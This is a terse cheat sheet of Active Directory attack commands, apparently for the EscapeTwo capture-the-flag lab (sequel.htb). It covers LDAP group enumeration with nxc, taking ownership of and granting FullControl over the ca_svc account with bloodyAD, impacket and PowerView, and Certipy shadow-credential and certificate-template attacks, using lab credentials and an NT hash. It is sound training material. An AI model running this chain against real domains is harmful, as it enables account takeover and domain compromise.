## List AD groups
`nxc ldap dc01.sequel.htb -u users.txt -p passwords.txt --groups`
`nxc ldap dc01.sequel.htb -u users.txt -p passwords.txt -M group-mem -o group="Remote Managment Users"`
## WriteOwner privilege
- bloodyAD
`bloodyAD --host '10.10.XX.XX' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'`
- impacket
`impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'dc01.sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'`
- PowerView
`Set-DomainObjectOwner -TargetIdentity ca_svc -PrincipalIdentity ryan`
## Grant FullControl rights
- PowerView
`Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights fullcontrol`
- impacket
`impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc dc01.sequel.htb/ryan:WqSZAF6CysDQbGb3`
## Certipy-AD
`certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'`
`certipy-ad find -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable -dc-ip 10.10.11.51`